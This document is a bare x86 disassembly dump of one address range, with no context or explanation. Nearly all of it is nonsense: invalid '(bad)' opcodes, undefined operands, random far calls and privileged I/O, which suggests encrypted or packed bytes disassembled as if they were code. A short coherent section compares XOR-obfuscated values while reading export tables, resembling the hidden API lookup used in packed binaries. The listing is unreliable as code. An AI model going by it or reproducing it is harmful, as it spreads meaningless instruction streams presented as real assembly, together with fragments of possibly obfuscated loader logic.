  414641:	mov    bl,0x15
  414643:	sbb    eax,0xc366c068
  414648:	arpl   bp,bp
  41464a:	xchg   edx,eax
  41464b:	jnp    0x4146a6
  41464d:	push   edx
  41464e:	dec    edi
  41464f:	mov    BYTE PTR [edi-0x56],al
  414652:	test   DWORD PTR [edi],0x28595ca6
  414658:	loopne 0x414653
  41465a:	jne    0x414631
  41465c:	aaa    
  41465d:	inc    ebp
  41465e:	mov    dl,0x31
  414660:	pop    esi
  414661:	call   0x9c5a:0x2e342b9b
  414668:	scas   eax,DWORD PTR es:[edi]
  414669:	cwde   
  41466a:	es jno 0x4146c2
  41466d:	ds stos BYTE PTR es:[edi],al
  41466f:	xchg   edi,eax
  414670:	iret   
  414671:	inc    eax
  414672:	sbb    ecx,DWORD PTR [ecx+edi*2-0x33643a29]
  414679:	mov    dl,BYTE PTR [ebx+0x5f]
  41467c:	out    0x9,eax
  41467e:	mov    ebx,0xa3448077
  414683:	mov    edi,0x41db25d5
  414688:	inc    esp
  414689:	sahf   
  41468a:	popa   
  41468b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41468c:	jne    0x414613
  41468e:	rol    DWORD PTR [ecx],0x85
  414691:	push   ebx
  414692:	or     ch,BYTE PTR [ebp+ecx*1-0x26b21034]
  414699:	in     eax,dx
  41469a:	daa    
  41469b:	iret   
  41469c:	stos   DWORD PTR es:[edi],eax
  41469d:	sbb    edi,ecx
  41469f:	ja     0x4146a8
  4146a1:	outs   dx,DWORD PTR ds:[esi]
  4146a2:	jg     0x4146c2
  4146a4:	out    dx,eax
  4146a5:	jne    0x4146d5
  4146a7:	pop    ecx
  4146a8:	mov    DWORD PTR [edx-0x21],edi
  4146ab:	iret   
  4146ac:	inc    esi
  4146ad:	jp     0x4146a3
  4146af:	jmp    0x8498b157
  4146b4:	ret    
  4146b5:	mov    ch,0x43
  4146b7:	icebp  
  4146b8:	les    esi,FWORD PTR [ebx]
  4146ba:	adc    bl,BYTE PTR [ecx]
  4146bc:	lea    edi,[eax-0x36]
  4146bf:	ret    
  4146c0:	ins    BYTE PTR es:[edi],dx
  4146c1:	pop    ebx
  4146c2:	xlat   BYTE PTR ds:[ebx]
  4146c3:	shl    ebp,0xa7
  4146c6:	dec    eax
  4146c7:	js     0x414715
  4146c9:	and    al,BYTE PTR [eax-0x5c]
  4146cc:	sub    ah,al
  4146ce:	ds and al,0x32
  4146d1:	sahf   
  4146d2:	daa    
  4146d3:	dec    edx
  4146d4:	jno    0x41468d
  4146d6:	pop    edi
  4146d7:	dec    ebp
  4146d8:	sbb    eax,0x97d7f640
  4146dd:	xor    DWORD PTR [ebp+0x60],ecx
  4146e0:	sahf   
  4146e1:	sub    BYTE PTR [ebx-0x10],bh
  4146e4:	mov    eax,0x1bd7b01e
  4146e9:	popa   
  4146ea:	pop    ss
  4146eb:	or     edx,DWORD PTR [ebp+0x4f]
  4146ee:	inc    esi
  4146ef:	sbb    ah,ch
  4146f1:	mov    eax,ds:0xd328ae6a
  4146f6:	ret    0xb772
  4146f9:	xchg   esp,eax
  4146fa:	mov    edi,0x4f12a2e6
  4146ff:	hlt    
  414700:	daa    
  414701:	xor    BYTE PTR [ecx+0x591e4b4a],0x88
  414708:	jne    0x414698
  41470a:	adc    DWORD PTR [edx],edi
  41470c:	push   ecx
  41470d:	mov    eax,0x7d37ebf0
  414712:	mov    fs,esp
  414714:	adc    ebp,DWORD PTR [esi]
  414716:	add    eax,0xc8e46806
  41471b:	xlat   BYTE PTR ds:[ebx]
  41471c:	xor    al,0x91
  41471e:	inc    ecx
  41471f:	lods   eax,DWORD PTR ds:[esi]
  414720:	sar    BYTE PTR [edi],cl
  414722:	xor    DWORD PTR [ebx-0x2e11bab1],esp
  414728:	lds    eax,FWORD PTR [esi+0x1c]
  41472b:	jbe    0x41472e
  41472d:	js     0x4147a8
  41472f:	pop    edx
  414730:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414731:	jne    0x41472e
  414733:	ins    BYTE PTR es:[edi],dx
  414734:	out    0x3b,al
  414736:	and    eax,0x91a418c9
  41473b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41473c:	mov    ebp,esi
  41473e:	es pop ecx
  414740:	mov    esp,0x9bf3370d
  414745:	push   ss
  414746:	or     bh,BYTE PTR [edx]
  414748:	(bad)  
  414749:	aad    0xe0
  41474b:	test   BYTE PTR [esi+eax*1-0x2a],cl
  41474f:	and    al,0x39
  414751:	les    esi,FWORD PTR [ebx+ebp*8+0x4b]
  414755:	or     cl,BYTE PTR [edx+0x70]
  414758:	mov    ebx,0xa9273b8c
  41475d:	fs pop esi
  41475f:	pop    ss
  414760:	and    DWORD PTR [eax+0x71],eax
  414763:	iret   
  414764:	jge    0x4147d1
  414766:	xchg   esp,eax
  414767:	sub    BYTE PTR [eax+0x3f20e859],dh
  41476d:	not    bh
  41476f:	mov    eax,0x270146d0
  414774:	shl    DWORD PTR [ecx],0x55
  414777:	fsub   DWORD PTR [ebx+ecx*8+0x74]
  41477b:	mov    ebp,0x2caaf736
  414780:	aaa    
  414781:	retf   
  414782:	cmp    ch,BYTE PTR [esi+0x432c7afc]
  414788:	sub    esp,DWORD PTR [edx+0x38deb5cb]
  41478e:	mov    ?,WORD PTR [eax]
  414790:	jbe    0x4147ef
  414792:	shr    BYTE PTR [ecx-0x35],cl
  414795:	xor    ebx,eax
  414797:	aaa    
  414798:	cdq    
  414799:	sub    al,0x8e
  41479b:	inc    ebx
  41479c:	sbb    al,0x32
  41479e:	xchg   DWORD PTR [esp+edx*4+0x34],edi
  4147a2:	jbe    0x4147bc
  4147a4:	jmp    0x4147de
  4147a6:	mov    cl,0x9b
  4147a8:	pop    edi
  4147a9:	ins    BYTE PTR es:[edi],dx
  4147aa:	jle    0x4147f0
  4147ac:	lea    edx,[esi+edx*8-0x2f]
  4147b0:	and    DWORD PTR [ebp-0x63],esp
  4147b3:	retf   0x3359
  4147b6:	in     al,0x8
  4147b8:	xchg   DWORD PTR [ecx+edx*8+0x5],ecx
  4147bc:	xor    bl,dl
  4147be:	mov    al,BYTE PTR [edx-0x3b]
  4147c1:	stos   BYTE PTR es:[edi],al
  4147c2:	jg     0x414832
  4147c4:	inc    edx
  4147c5:	jp     0x4147b8
  4147c7:	jns    0x41478e
  4147c9:	and    BYTE PTR [edi],dl
  4147cb:	mov    al,ds:0x9a9e95f2
  4147d0:	xchg   DWORD PTR [ebx+0x53],ecx
  4147d3:	xor    al,0x7f
  4147d5:	mov    bh,0x3b
  4147d7:	(bad)  
  4147d9:	mov    ds:0x637514a2,eax
  4147de:	push   0xdf697488
  4147e3:	test   eax,0x674bcc9
  4147e8:	and    DWORD PTR [ecx-0xc],eax
  4147eb:	pop    ss
  4147ec:	add    BYTE PTR [ebx+0x5],0xfc
  4147f0:	in     eax,0x9b
  4147f2:	in     al,0x30
  4147f4:	mov    bh,dh
  4147f6:	mov    al,ds:0xedfb6a99
  4147fb:	mov    al,0xe9
  4147fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147fe:	cmp    eax,0xb91eb20
  414803:	jg     0x414852
  414805:	xchg   esi,eax
  414806:	xchg   ebx,eax
  414807:	stc    
  414808:	enter  0x6bc,0xf8
  41480c:	(bad)
  414810:	dec    ebx
  414811:	push   ecx
  414812:	out    dx,eax
  414813:	cmp    DWORD PTR [esi+0x4bdd83c5],esi
  414819:	int    0x9c
  41481b:	mov    ax,0x739
  41481f:	aad    0xc3
  414821:	addr16 push edx
  414823:	xor    DWORD PTR [esi],ecx
  414825:	pop    eax
  414826:	cmp    al,0x49
  414828:	xchg   edi,eax
  414829:	add    ah,BYTE PTR [ecx+ebx*1]
  41482c:	fld    QWORD PTR [ebx]
  41482e:	and    DWORD PTR [ebp-0x2e],edx
  414831:	inc    edx
  414832:	dec    esp
  414833:	adc    ebx,DWORD PTR [esi-0x4b]
  414836:	cwde   
  414837:	shl    BYTE PTR [ebp+0x1105cf1f],1
  41483d:	ret    0x78d6
  414840:	int    0x7a
  414842:	push   es
  414843:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  414845:	(bad)  
  414846:	mov    bl,0x8b
  414848:	dec    ebp
  414849:	clc    
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x414842
  414861:	push   0x6b
  414863:	push   esi
  414864:	adc    bh,BYTE PTR [ebp+0x7f]
  414867:	jo     0x414822
  414869:	jle    0x4148db
  41486b:	jo     0x4147f1
  41486d:	dec    edx
  41486e:	push   eax
  41486f:	(bad)  
  414870:	push   ss
  414871:	dec    esi
  414872:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414873:	cmc    
  414874:	cmp    al,0xad
  414876:	adc    edi,DWORD PTR [ecx-0x27b4f476]
  41487c:	cld    
  41487d:	into   
  41487e:	sti    
  41487f:	dec    ebx
  414880:	inc    ebp
  414881:	jge    0x414885
  414883:	cmc    
  414884:	call   0x2af2d865
  414889:	sbb    eax,0x1687b298
  41488e:	leave  
  41488f:	ins    DWORD PTR es:[edi],dx
  414890:	jecxz  0x41483c
  414892:	loopne 0x4148b5
  414894:	pop    esp
  414895:	loopne 0x414871
  414897:	pop    ds
  414898:	iret   
  414899:	jae    0x4148d2
  41489b:	shl    DWORD PTR [ebp-0x3ba3b47d],1
  4148a1:	loopne 0x41484d
  4148a3:	push   eax
  4148a4:	loop   0x414894
  4148a6:	idiv   BYTE PTR [edi]
  4148a8:	test   DWORD PTR [ecx],ecx
  4148aa:	mov    bh,0xd7
  4148ac:	xchg   esp,eax
  4148ad:	mov    dl,0x6b
  4148af:	pop    edi
  4148b0:	xor    ah,bl
  4148b2:	mov    eax,ds:0x15af8564
  4148b7:	iret   
  4148b8:	lods   eax,DWORD PTR ds:[esi]
  4148b9:	jno    0x4148cc
  4148bb:	fs mov bl,0xa1
  4148be:	lock fisubr DWORD PTR [edx-0x50]
  4148c2:	mov    DWORD PTR ds:0xa485faf5,eax
  4148c8:	sbb    BYTE PTR [eax],ch
  4148ca:	arpl   WORD PTR [ecx+ecx*8+0x1326b51a],ax
  4148d1:	hlt    
  4148d2:	sub    bh,BYTE PTR fs:[esp+eax*8+0x42]
  4148d7:	ss test al,0xd
  4148da:	bound  ebp,QWORD PTR [ebx-0x1c]
  4148dd:	adc    DWORD PTR gs:[eax+0x43],0xcbfd53fd
  4148e5:	jo     0x414894
  4148e7:	rol    BYTE PTR [ecx+0x7da983e0],0x5a
  4148ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148ef:	jb     0x414894
  4148f1:	mov    al,ds:0xad138d6b
  4148f6:	dec    ecx
  4148f7:	jns    0x4148d8
  4148f9:	pushf  
  4148fa:	mov    cl,0x80
  4148fc:	lods   al,BYTE PTR ds:[esi]
  4148fd:	lods   al,BYTE PTR ds:[esi]
  4148fe:	sub    BYTE PTR [ebx-0x63],bh
  414901:	sub    eax,0x8b914b58
  414906:	sbb    esp,DWORD PTR [ebx]
  414908:	stos   DWORD PTR es:[edi],eax
  414909:	idiv   dl
  41490b:	xor    al,dh
  41490d:	fucomi st,st(0)
  41490f:	lea    esp,[ebp+ebx*2+0x1b]
  414913:	inc    ebp
  414914:	pop    ecx
  414915:	sub    BYTE PTR [eax-0x10],dh
  414918:	mov    ebx,ebp
  41491a:	outs   dx,DWORD PTR ds:[esi]
  41491b:	jbe    0x41495e
  41491d:	pop    ebx
  41491e:	ds ins BYTE PTR es:[edi],dx
  414920:	xchg   edx,eax
  414921:	sbb    dl,BYTE PTR [ebx+0x2c]
  414924:	push   ds
  414925:	sti    
  414926:	xchg   ebx,eax
  414927:	sbb    DWORD PTR [ebp-0x10ea6bb],0xffffffc4
  41492e:	setg   bl
  414931:	test   ch,bh
  414933:	mov    edi,esi
  414935:	mov    bl,0x8a
  414937:	jmp    0x41496f
  414939:	cwde   
  41493a:	jae    0x41498c
  41493c:	sub    DWORD PTR [ebx],ebp
  41493e:	mov    edx,0xabdad94d
  414943:	or     edi,DWORD PTR [esi]
  414945:	cmp    DWORD PTR [edi-0x4445956],0x55f3ff2d
  41494f:	push   esi
  414950:	test   al,0xe0
  414952:	dec    edi
  414953:	adc    eax,0x85d3d440
  414958:	shr    BYTE PTR [edx+0x7a],cl
  41495b:	inc    esp
  41495c:	test   eax,0x47d67711
  414961:	jno    0x414998
  414963:	dec    edi
  414964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414965:	(bad)  
  414966:	add    bh,dl
  414968:	push   esi
  414969:	imul   ebp,DWORD PTR [ecx],0xffffffc6
  41496c:	js     0x4149e9
  41496e:	rol    BYTE PTR [edx],cl
  414970:	retf   
  414971:	std    
  414972:	sub    DWORD PTR [esi+0x48],eax
  414975:	(bad)  
  414976:	out    dx,al
  414977:	mov    eax,edx
  414979:	jp     0x414974
  41497b:	addr16 test eax,0xec3050f3
  414981:	lods   eax,DWORD PTR ds:[esi]
  414982:	sub    al,0x78
  414984:	sbb    eax,0x65ed8875
  414989:	into   
  41498a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41498b:	mov    eax,ds:0x620b2eb
  414990:	into   
  414991:	mov    al,ds:0xc52ad0d7
  414996:	xor    esp,DWORD PTR [eax+0x2]
  414999:	sti    
  41499a:	or     ebp,0x7a
  41499d:	mov    BYTE PTR [edi-0x22],ch
  4149a0:	jmp    0x7279:0x89ce277f
  4149a7:	shl    esi,0x96
  4149aa:	mov    ch,0x1
  4149ac:	push   ecx
  4149ad:	inc    eax
  4149ae:	into   
  4149af:	repz jg 0x4149a8
  4149b2:	fwait
  4149b3:	lock or DWORD PTR [ebp-0x5a09c7bf],esi
  4149ba:	adc    eax,0x104aa0a6
  4149bf:	jmp    0x414977
  4149c1:	dec    esi
  4149c2:	rcr    DWORD PTR [esi],cl
  4149c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149c5:	add    al,0x58
  4149c7:	in     eax,dx
  4149c8:	ss pushf 
  4149ca:	cdq    
  4149cb:	call   0x5571a593
  4149d0:	push   edx
  4149d1:	cmp    ch,BYTE PTR es:[ebp+0x75204e2d]
  4149d8:	dec    ebx
  4149d9:	xor    al,0xfe
  4149db:	pusha  
  4149dc:	pusha  
  4149dd:	mov    cl,0x71
  4149df:	jle    0x41496a
  4149e1:	in     al,0xc3
  4149e3:	idiv   DWORD PTR [ecx]
  4149e5:	jge    0x4149c6
  4149e7:	call   0xdb49:0x9efe1659
  4149ee:	fstp   DWORD PTR [esi+eiz*1+0x5eed207e]
  4149f5:	jge    0x414980
  4149f7:	mov    al,0x15
  4149f9:	ss jmp 0x9e94afe3
  4149ff:	sar    BYTE PTR [ebp+0x43a8c843],1
  414a05:	xor    eax,esi
  414a07:	jle    0x4149e4
  414a09:	into   
  414a0a:	inc    ebx
  414a0b:	inc    edx
  414a0c:	ficom  DWORD PTR [ebp+0x2e]
  414a0f:	mov    WORD PTR [ebx],gs
  414a11:	nop
  414a12:	aaa    
  414a13:	hlt    
  414a14:	cmp    al,0xc6
  414a16:	sbb    al,0x40
  414a18:	and    edi,0xffffff87
  414a1b:	mov    DWORD PTR fs:0xaa054926,0x8918843d
  414a26:	out    0x4c,al
  414a28:	fs out 0x89,al
  414a2b:	mov    eax,0x84c61c67
  414a30:	cwde   
  414a31:	call   0x9235:0xa4119619
  414a38:	sar    BYTE PTR [ecx-0x3f],cl
  414a3b:	and    DWORD PTR [esi-0x56a80670],0x6aeb65fa
  414a45:	jle    0x414a86
  414a47:	mov    ebp,0xad1511ed
  414a4c:	xor    BYTE PTR [eax-0x75],dh
  414a4f:	pop    edi
  414a50:	add    eax,0xb8d35c71
  414a55:	(bad)  
  414a57:	loopne 0x414a7a
  414a59:	out    0x7a,eax
  414a5b:	fidivr DWORD PTR [edx-0x4f]
  414a5e:	jae    0x414ac7
  414a60:	retf   
  414a61:	sti    
  414a62:	data16 mov al,ds:0x29600ef5
  414a68:	cmp    DWORD PTR [edx+edi*4],esp
  414a6b:	inc    ecx
  414a6c:	shl    DWORD PTR [eax-0x6ad3d2a0],1
  414a72:	jno    0x414a6a
  414a74:	or     ch,BYTE PTR [edi-0x29]
  414a77:	xor    eax,0xb9aad342
  414a7c:	outs   dx,BYTE PTR ds:[esi]
  414a7d:	gs pop eax
  414a7f:	out    dx,eax
  414a80:	loop   0x414ace
  414a82:	and    BYTE PTR ds:0x3a39e170,al
  414a88:	stos   BYTE PTR es:[edi],al
  414a89:	mov    al,0xbb
  414a8b:	hlt    
  414a8c:	iret   
  414a8d:	mov    edi,0x5655689e
  414a92:	into   
  414a93:	sbb    al,0x12
  414a95:	mov    ds:0xdb11a480,al
  414a9a:	fst    QWORD PTR [eax+0x2e]
  414a9d:	cmp    al,0x98
  414a9f:	adc    al,0xd4
  414aa1:	lods   al,BYTE PTR ds:[esi]
  414aa2:	div    DWORD PTR [esi]
  414aa4:	repnz dec ecx
  414aa6:	fdivr  DWORD PTR [esi+ecx*4+0x7c1aa91d]
  414aad:	aaa    
  414aae:	sbb    DWORD PTR [ebp+0x3],ecx
  414ab1:	lea    edi,[eax+edx*1+0x3e]
  414ab5:	mov    ah,0x4e
  414ab7:	addr16 mov al,ds:0xa1eb
  414abb:	cmp    al,0x69
  414abd:	aad    0xfb
  414abf:	pop    ebp
  414ac0:	dec    ecx
  414ac1:	sub    eax,0x643d92fd
  414ac6:	pop    ds
  414ac7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ac8:	or     ebx,DWORD PTR [ecx]
  414aca:	cmp    al,BYTE PTR [ebp+0x5c2be2f]
  414ad0:	dec    ebp
  414ad1:	pop    ss
  414ad2:	inc    edx
  414ad3:	or     ch,BYTE PTR [eax]
  414ad5:	jo     0x414aad
  414ad7:	into   
  414ad8:	jns    0x414b23
  414ada:	pop    ds
  414adb:	mov    edx,0x32e038b5
  414ae0:	stc    
  414ae1:	cli    
  414ae2:	or     ch,BYTE PTR [ebx-0x19]
  414ae5:	das    
  414ae6:	lds    esi,FWORD PTR [ebx+0x23]
  414ae9:	outs   dx,BYTE PTR ds:[esi]
  414aea:	push   ebx
  414aeb:	pop    edx
  414aec:	inc    edx
  414aed:	mov    BYTE PTR [ebx+0x43f30f1c],dh
  414af3:	xlat   BYTE PTR ds:[ebx]
  414af4:	fist   DWORD PTR [edi+0x78]
  414af7:	ins    BYTE PTR es:[edi],dx
  414af8:	loop   0x414ad8
  414afa:	stos   BYTE PTR es:[edi],al
  414afb:	pop    edx
  414afc:	jo     0x414b67
  414afe:	ss scas al,BYTE PTR es:[edi]
  414b00:	mov    edi,0x55a1f8e4
  414b05:	mov    al,ds:0x447b544f
  414b0a:	jno    0x414aed
  414b0c:	push   edi
  414b0d:	stos   BYTE PTR es:[edi],al
  414b0e:	fidiv  WORD PTR [esp+ecx*8+0x5a3c619b]
  414b15:	mov    esi,DWORD PTR [edx]
  414b17:	outs   dx,BYTE PTR ds:[esi]
  414b18:	scas   al,BYTE PTR es:[edi]
  414b19:	push   0xf6590795
  414b1e:	add    ebp,DWORD PTR [eiz*1+0x46123f60]
  414b25:	repnz mov DWORD PTR [eax+ebp*4],esp
  414b29:	inc    edx
  414b2a:	inc    edi
  414b2b:	push   edx
  414b2c:	cs jl  0x414b47
  414b2f:	imul   esp,DWORD PTR [ecx-0x31],0x18
  414b33:	add    eax,ebx
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	inc    esp
  414bb7:	inc    ebx
  414bb8:	out    dx,eax
  414bb9:	fcomp  QWORD PTR [ebx+0x7b]
  414bbc:	jg     0x414c2e
  414bbe:	mov    ecx,0x6e70707e
  414bc3:	mov    ecx,0x6d2aae30
  414bc8:	rcl    BYTE PTR [esi+edx*4+0x3e627805],1
  414bcf:	fsubp  st(0),st
  414bd1:	sub    DWORD PTR [edx-0x5d74bc50],ecx
  414bd7:	mov    eax,ds:0x192d0f58
  414bdc:	fsub   QWORD PTR [edi]
  414bde:	push   ebx
  414bdf:	push   ebx
  414be0:	push   ss
  414be1:	int3   
  414be2:	and    ch,0x98
  414be5:	pop    edi
  414be6:	call   0xd375:0x5050fb87
  414bed:	popf   
  414bee:	fisubr WORD PTR [edx-0x6d2d91f0]
  414bf4:	xchg   ecx,eax
  414bf5:	std    
  414bf6:	jecxz  0x414b97
  414bf8:	loopne 0x414c34
  414bfa:	jle    0x414bf5
  414bfc:	inc    esi
  414bfd:	mov    ds:0xd8c35ed8,al
  414c02:	shl    BYTE PTR [edi],1
  414c04:	jmp    0x76f09a43
  414c09:	push   es
  414c0a:	in     eax,dx
  414c0b:	inc    ecx
  414c0c:	call   0x840a8fe3
  414c11:	loope  0x414c18
  414c13:	sub    dh,BYTE PTR [edi-0x51]
  414c16:	sub    eax,0x510a11d8
  414c1b:	push   esp
  414c1c:	xchg   DWORD PTR [ebp+0x68],ebx
  414c1f:	pop    ebp
  414c20:	sahf   
  414c21:	pop    ds
  414c22:	jp     0x414bb7
  414c24:	fwait
  414c25:	sub    eax,0x5184c0ca
  414c2a:	dec    esp
  414c2b:	test   DWORD PTR [edx+ebx*2-0x20d8b164],0x362ea314
  414c36:	sar    DWORD PTR [ebx],0xb0
  414c39:	retf   
  414c3a:	ror    edx,0x16
  414c3d:	shr    BYTE PTR [esi],0xdc
  414c40:	jle    0x414c11
  414c42:	scas   eax,DWORD PTR es:[edi]
  414c43:	repz push ebx
  414c45:	push   ds
  414c46:	pop    edx
  414c47:	pop    esp
  414c48:	adc    eax,0x380f9b8e
  414c4d:	rcl    ebx,0x81
  414c50:	std    
  414c51:	xchg   ecx,eax
  414c52:	dec    ecx
  414c53:	mov    bl,bl
  414c55:	stos   BYTE PTR es:[edi],al
  414c56:	out    dx,eax
  414c57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c58:	call   0xfebb:0xab28f068
  414c5f:	into   
  414c60:	xchg   edi,eax
  414c61:	and    ebx,ecx
  414c63:	push   0xffffff8a
  414c65:	jecxz  0x414c11
  414c67:	in     eax,dx
  414c68:	sbb    BYTE PTR [esi+ebx*1-0x20561aa0],dh
  414c6f:	and    eax,ebx
  414c71:	jbe    0x414c59
  414c73:	sub    al,0xfe
  414c75:	pusha  
  414c76:	out    0xc6,eax
  414c78:	mov    eax,0xd971737b
  414c7d:	cmp    esp,DWORD PTR ds:0x11eea381
  414c83:	cmc    
  414c84:	xchg   ecx,eax
  414c85:	sub    al,0xc0
  414c87:	ds adc eax,0xfc690453
  414c8d:	pop    ebx
  414c8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c8f:	sbb    eax,0xa7ffc3fa
  414c94:	push   ds
  414c95:	cld    
  414c96:	mov    esp,0x6ba98d75
  414c9b:	std    
  414c9c:	xchg   edx,eax
  414c9d:	cld    
  414c9e:	jns    0x414c8f
  414ca0:	mov    ds,WORD PTR ds:0xf76bf809
  414ca6:	lea    ecx,[ebp+0x1b28e36a]
  414cac:	jb     0x414c3b
  414cae:	stc    
  414caf:	(bad)  
  414cb0:	in     al,dx
  414cb1:	aaa    
  414cb2:	push   ebp
  414cb3:	sub    dh,BYTE PTR [esi-0x3395fada]
  414cb9:	ja     0x414cc4
  414cbb:	ror    BYTE PTR [edi],0xd6
  414cbe:	adc    bh,ah
  414cc0:	add    cl,BYTE PTR [ecx-0x7b]
  414cc3:	or     ecx,DWORD PTR [edx+0x61d80045]
  414cc9:	lahf   
  414cca:	pushf  
  414ccb:	pushf  
  414ccc:	imul   ecx,ebp,0xe2ea7558
  414cd2:	cld    
  414cd3:	mov    bh,0xb5
  414cd5:	int    0xea
  414cd7:	dec    ebx
  414cd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cd9:	es out dx,eax
  414cdb:	mov    edx,0x1b252a22
  414ce0:	xchg   ecx,eax
  414ce1:	cmp    edi,DWORD PTR [ebx+esi*8+0x70]
  414ce5:	push   0xc2cdcb64
  414cea:	jecxz  0x414d5d
  414cec:	jp     0x414cc6
  414cee:	pop    ss
  414cef:	dec    edi
  414cf0:	pushf  
  414cf1:	mov    ebp,0x58a4ae0c
  414cf6:	pop    ebp
  414cf7:	pop    ss
  414cf8:	and    esp,DWORD PTR [edx+0x1acc8e2a]
  414cfe:	xor    eax,0x9fd766c8
  414d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d04:	pop    ecx
  414d05:	clc    
  414d06:	xchg   BYTE PTR [edx+0x7a6c4c14],cl
  414d0c:	xchg   edi,ecx
  414d0e:	leave  
  414d0f:	xchg   ebx,eax
  414d10:	popf   
  414d11:	(bad)  
  414d13:	jns    0x414cfd
  414d15:	das    
  414d16:	inc    ebx
  414d17:	push   esp
  414d18:	loop   0x414d6e
  414d1a:	and    esi,DWORD PTR [eax]
  414d1c:	pop    edi
  414d1d:	test   BYTE PTR [edx],al
  414d1f:	addr16 lock retf 
  414d22:	cli    
  414d23:	faddp  st(0),st
  414d25:	sub    ebp,ebx
  414d27:	mov    ch,0x21
  414d29:	imul   esp,esi,0xffffffef
  414d2c:	dec    edx
  414d2d:	lods   al,BYTE PTR ds:[esi]
  414d2e:	and    BYTE PTR [ebx+eiz*1+0x23],ah
  414d32:	mov    WORD PTR [ebx],?
  414d34:	cmp    eax,0x6f36e491
  414d39:	adc    al,0x6c
  414d3b:	call   0x2d9af110
  414d40:	mov    BYTE PTR [edi-0x4f],al
  414d43:	fild   DWORD PTR [ecx+0x6d]
  414d46:	pop    esi
  414d47:	or     eax,0x937640d0
  414d4c:	rol    edi,cl
  414d4e:	mov    WORD PTR [edi+edi*2],gs
  414d51:	push   es
  414d52:	gs cmp eax,0x15d275f0
  414d58:	enter  0x7c26,0x83
  414d5c:	shl    esi,0x58
  414d5f:	mov    cl,0x2a
  414d61:	loop   0x414d53
  414d63:	push   eax
  414d64:	fucomi st,st(6)
  414d66:	jb     0x414d2c
  414d68:	inc    eax
  414d6a:	dec    eax
  414d6b:	dec    edx
  414d6c:	or     al,0xa6
  414d6e:	and    bh,BYTE PTR [eax+ebx*4]
  414d71:	mov    ds:0x324233e4,al
  414d76:	popf   
  414d77:	mov    eax,ds:0xf86682a8
  414d7c:	push   0xc
  414d7e:	adc    al,bl
  414d80:	call   0x9fcb28b7
  414d85:	sbb    ebp,DWORD PTR [edi+0x71]
  414d88:	push   esp
  414d89:	loopne 0x414dd7
  414d8b:	je     0x414d65
  414d8d:	mov    dh,0x96
  414d8f:	rcl    dl,cl
  414d91:	das    
  414d92:	ror    BYTE PTR [edi],0xf2
  414d95:	push   eax
  414d96:	inc    ax
  414d98:	add    al,0xac
  414d9a:	aas    
  414d9b:	mov    ebp,ebp
  414d9d:	lea    esp,[ebx]
  414d9f:	mov    eax,0xd6ec31db
  414da4:	addr16 cmp eax,0x8b30e95b
  414daa:	out    dx,eax
  414dab:	dec    esp
  414dac:	inc    eax
  414dad:	mov    ah,0x4b
  414daf:	xchg   ecx,eax
  414db0:	xchg   ecx,eax
  414db1:	mov    WORD PTR [edi+0x39],cs
  414db4:	jmp    0xc5850ac9
  414db9:	push   esi
  414dba:	in     al,0xf3
  414dbc:	and    eax,0x36fd0985
  414dc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dc2:	push   cs
  414dc3:	inc    ebx
  414dc4:	sbb    eax,0x7e0be3d7
  414dc9:	(bad)  
  414dca:	cmp    ebx,DWORD PTR [edx]
  414dcc:	push   eax
  414dcd:	add    bh,cl
  414dcf:	mov    cs,WORD PTR [eax+eax*2]
  414dd2:	push   esp
  414dd3:	dec    eax
  414dd4:	pop    ss
  414dd5:	mov    dl,0x3b
  414dd7:	inc    esp
  414dd8:	xchg   ebx,eax
  414dd9:	outs   dx,DWORD PTR ds:[esi]
  414dda:	pop    edi
  414ddb:	repnz pop esp
  414ddd:	retf   
  414dde:	cmp    BYTE PTR [edi-0x23],0x74
  414de2:	ret    0x637
  414de5:	jge    0x414da0
  414de7:	dec    ebp
  414de8:	pop    eax
